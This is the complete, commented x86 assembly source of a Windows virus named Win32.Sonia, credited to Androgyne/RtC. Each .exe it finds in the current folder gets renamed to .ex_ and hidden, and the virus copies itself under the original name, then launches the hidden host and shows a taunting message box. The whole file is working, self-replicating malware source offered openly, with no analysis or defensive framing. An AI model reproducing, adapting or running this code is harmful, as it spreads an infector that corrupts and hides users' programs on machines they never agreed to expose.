; Win32.Sonia virus by Androgyne/RtC
; "Have I fucked up Win32.Sonia ?"
;


.386
.model flat, STDCALL

    include win32.inc

    extrn FindFirstFileA:PROC
    extrn FindNextFileA:PROC
    extrn MoveFileA:PROC
    extrn CopyFileA:PROC
    extrn GetFileAttributesA:PROC
    extrn SetFileAttributesA:PROC
    extrn WinExec:PROC
    extrn MessageBoxA:PROC
    extrn GetCommandLineA:PROC
    extrn ExitProcess:PROC

.data

virus_name          db 'Win32.Sonia',0
virus_author        db 'Androgyne/RtC',0
virus_version       db 'asm version',0

MB_titre            db 'Win32.Sonia',0
MB_text             db 'Have I fucked up Win32.Sonia ?',0
FF_mask             db '*.exe'
FF_data             WIN32_FIND_DATA <>
self_file           db MAX_PATH dup (0)             ; the useful part of the command line (see below)
new_name            db MAX_PATH dup (0)             ; the new name of the victim
command_line        dd ?                            ; address of command line

.code

Sonia:

    call GetCommandLineA                            ; we get the command line
    mov dword ptr [command_line], eax               ; we save its address

    mov esi,eax                                     ; a command line is this :
    inc esi                                         ;  "X:\path\file.exe" options
    lea edi,self_file                               ; here, on get what is between the first two "
    xor eax,eax
  copy_until_quotes:
    lodsb
    stosb
    cmp al,22h                                      ; is it " ?
    jnz copy_until_quotes
    mov byte ptr [edi - 1],0                        ; we stop the string to remove the "(fucking Windows)

    call FindFirstFileA, offset FF_mask, offset FF_data

    mov ebx,eax                                     ; we put search handle in ebx
    inc eax                                         ; is it finished ?

    jz Exec_Host                                    ; yes, execute the host...

Infect:

    lea esi,FF_data.cFileName                       ; we make a copy of the name of the new victim
    lea edi,new_name
    xor eax,eax
  copy_string:
    lodsb
    stosb
    or al,al                                        ; 0 ?
    jnz copy_string                                 ; no, it's not the end of the string
    mov byte ptr [edi - 2],'_'                      ; we replace 'exe' by 'ex_'

    call MoveFileA, offset FF_data.cFileName, offset new_name   ; we change the name
    or eax,eax
    jz Go_on_searching                              ; if the ex_ file is still existing, we go on searching

    call GetFileAttributesA, offset new_name        ; we get the attributes
    or eax,FILE_ATTRIBUTE_HIDDEN                    ; we had the hidden attribute
    call SetFileAttributesA, offset new_name, eax   ; we set the new attributes

    call CopyFileA, offset self_file, offset FF_data.cFileName, TRUE ; we copie the virus under the name of the victim

Go_on_searching:

    call FindNextFileA, ebx, offset FF_data         ; we go on searching

    or eax,eax                                      ; is there anymore ?
    jnz Infect                                      ; yes, go on infecting...

Exec_Host:

    mov edi, dword ptr [command_line]               ; in the command line,
    inc edi                                         ; we replace 'exe' by 'ex_'
    mov eax,22h                                     ; we know 'exe' is just before the second quote
    mov ecx,MAX_PATH                                ; we avoid the first one and we reach the second one
    repne scasb                                     ; we come back a little and change
    mov byte ptr [edi - 2],'_'                      ; 'exe' in 'ex_' and that's all folks !

    call WinExec, command_line, SW_SHOWNORMAL       ; we execute the host with the modified command line...

Payload:

    call MessageBoxA, 0, offset MB_text, offset MB_titre, MB_ICONASTERISK     ; just a simple message box

    call ExitProcess, 0                             ; bye bye !

end Sonia